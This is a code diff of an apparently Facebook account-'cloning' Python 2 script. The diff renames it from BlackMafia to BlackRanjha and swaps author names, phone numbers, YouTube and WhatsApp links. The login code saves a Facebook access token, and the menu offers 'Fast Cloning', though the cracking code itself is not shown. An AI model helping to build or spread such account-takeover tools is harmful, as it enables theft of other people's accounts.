@@ -64,16 +64,16 @@ logo='''
 \033[1;92m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
 \033[1;92m ┈┈┈▕▕╲┊┊╱▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕╲┊┊╱▏▏┈┈┈
 \033[1;92m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
-\033[1;92m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;96mBlackMafia.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
+\033[1;92m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;96mBlackRanjha.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
 \033[1;92m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
 \033[1;92m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
-\033[1;92m................\033[1;96mBlackMafia\033[1;91m...............
+\033[1;92m................\033[1;96mBlackRanjha\033[1;91m...............
 \033[1;92m................\033[1;96m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 
-\033[1;91m☞ Auther     : lovehacker✅
-\033[1;92m☞ WhatsApp   : 03094161457
+\033[1;91m☞ Auther     : BlackRanjha✅
+\033[1;92m☞ WhatsApp   : 03414826359
 \033[1;95m☞ YouTube    : https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
@@ -105,7 +105,7 @@ def login():
 		    st.write(z["access_token"])
 		    st.close()
 		    print (S + '[☆]' + Y + ' Login successfull 100% ✓')
-		    os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+		    os.system('xdg-open https://www.youtube.com/channel/UCPjsRDBYr8KIR-3iMs00zmg')
 		    menu()
 		else:
 		    if "www.facebook.com" in z["error_msg"]:
@@ -146,8 +146,8 @@ def menu():
 	print (S + 50*'-')
 	print
 	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
-	print (S + '[' + P + '☞2' + S + ']' + S + ' Update BlackMafia Tool')
-	print (S + '[' + P + '☞3' + S + ']' + S + ' Black Mafia WhatsApp Group')
+	print (S + '[' + P + '☞2' + S + ']' + S + ' Update BlackRanjha Tool')
+	print (S + '[' + P + '☞3' + S + ']' + S + ' Black Ranjha WhatsApp Group')
 	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
 	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit')
 	print
@@ -179,17 +179,17 @@ def mb():
 	    psb('☆☆☆☆☆☆☆☆☆90%')
 	    psb('☆☆☆☆☆☆☆☆☆☆100%')
 	    psb('Frends login new Account✓')
-	    psb('WhatsApp Num 03094161457✓')
-	    psb('WellCome To BlackMafia')
-	    psb('Congratulations lovehacker Tool Has Been Updated Successfully')
-	    psb('🔓User Name☆ BlackMafia✓')
-	    psb('🔓Password ☆ lovehacker✓')
-	    psb('Subscrib My Youtube Chenal loveHacker✓')
+	    psb('WhatsApp Num 03414826359✓')
+	    psb('WellCome To BlackRanjha')
+	    psb('Congratulations Mr Atiq Tool Has Been Updated Successfully')
+	    psb('🔓User Name☆ Blackranjha✓')
+	    psb('🔓Password ☆ MrAtiq✓')
+	    psb('Subscrib My Youtube Chenal NOTE POINT✓')
 	    psb('Please Login Again')
 	    time.sleep(2)
 	    os.system('cd $HOME/BlackMafia && python2 BlackMafia.py')
 	elif bm =='3':
-	    os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
+	    os.system('xdg-open https://chat.whatsapp.com/EL8DlR6KnAdJmemJuYgWJs')
 	    menu()
 	elif bm =='4':
 		psb('Token Has Been Removed')
@@ -357,7 +357,7 @@ def pb():
 	print(S+'BlackMafia')     
 	print
 	raw_input(R + 'Back')
-	os.system('python2 BlackMafia.py')
+	os.system('python2 BlackMafia.py'),
 if __name__=='__main__':
     login()
 
